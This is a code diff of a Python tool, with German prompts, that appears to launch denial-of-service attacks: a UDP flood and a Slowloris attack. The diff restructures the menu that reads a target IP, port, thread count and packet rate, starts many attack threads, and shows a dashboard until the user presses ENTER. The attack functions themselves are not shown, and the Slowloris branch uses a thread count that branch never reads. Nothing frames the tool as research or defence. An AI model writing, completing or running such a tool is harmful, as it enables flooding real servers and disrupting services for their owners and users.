@@ -102,40 +102,48 @@ if __name__ == "__main__":
             print("[INFO] Programm beendet.")
             sys.exit()
 
-if choice == "1":  # UDP Flood
-    ip = input("Ziel-IP-Adresse: ")
-    port = int(input("Ziel-Port: "))
-    duration = int(input("Dauer des Angriffs (Sekunden): "))
-    threads = int(input("Anzahl der Threads: "))
-    packet_size = max(1, min(65507, int(input("Paketgröße (Bytes, 1-65507): "))))
-    packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))
+        if choice == "1":  # UDP Flood
+            ip = input("Ziel-IP-Adresse: ")
+            port = int(input("Ziel-Port: "))
+            duration = int(input("Dauer des Angriffs (Sekunden): "))
+            threads = int(input("Anzahl der Threads: "))
+            packet_size = max(1, min(65507, int(input("Paketgröße (Bytes, 1-65507): "))))
+            packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))
 
-stop_event.clear()
-
-# Angriffsfunktionen den Optionen zuordnen
-if choice == "1":
-    attack_function = udp_flood
-    args = (ip, port, packet_size, packet_rate)
-
-elif choice == "2":
-    attack_function = slowloris
-    args = (ip, port)  # Standard-Port für Slowloris
-
-if choice == "3":
-            print("[INFO] Programm beendet.")
-            sys.exit()
+            stop_event.clear()
 
             # Threads starten
-    attack_threads = [
-        threading.Thread(target=udp_flood, args=(ip, port, packet_size, packet_rate, duration))
-        for _ in range(threads)
-                     ]
-    for thread in attack_threads:
-        thread.start()
+            attack_threads = [
+                threading.Thread(target=udp_flood, args=(ip, port, packet_size, packet_rate))
+                for _ in range(threads)
+            ]
+            for thread in attack_threads:
+                thread.start()
 
             # Dashboard starten
-    dashboard_thread = threading.Thread(target=dashboard)
-    dashboard_thread.start()
+            dashboard_thread = threading.Thread(target=dashboard)
+            dashboard_thread.start()
 
-    input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
-    stop_event.set()
+            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
+            stop_event.set()
+
+        elif choice == "2":  # Slowloris
+            ip = input("Ziel-IP-Adresse: ")
+            port = int(input("Ziel-Port: "))
+
+            stop_event.clear()
+
+            # Threads starten
+            attack_threads = [
+                threading.Thread(target=slowloris, args=(ip, port))
+                for _ in range(threads)
+            ]
+            for thread in attack_threads:
+                thread.start()
+
+            # Dashboard starten
+            dashboard_thread = threading.Thread(target=dashboard)
+            dashboard_thread.start()
+
+            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
+            stop_event.set()
